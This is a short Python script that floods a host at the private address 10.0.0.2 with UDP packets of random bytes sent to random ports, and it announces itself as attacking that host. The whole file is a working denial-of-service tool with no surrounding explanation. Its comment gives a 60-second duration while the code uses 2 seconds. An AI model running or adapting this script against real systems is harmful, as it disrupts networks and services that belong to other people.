import socket
import time
import random
import os
import ipaddress

# destination IP can be passed in argv later
dest_ip = "10.0.0.2"

# flood the packets for 60secs
interval = 2

def flood_udp_packets():
    start_time = time.time()

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        # validate the destination IP address
        try:
            ipaddress.ip_address(dest_ip)
        except ValueError:
            print("Invalid IP address")
            return

        print(f"Attacking host {dest_ip} with UDP flooding")
        while time.time() - start_time < interval:
            # choose a new random port every time
            port_num = random.randint(10, 6000)
            data = os.urandom(3)
            sock.sendto(bytes(data), (dest_ip, port_num))

if __name__ == "__main__":
    flood_udp_packets()
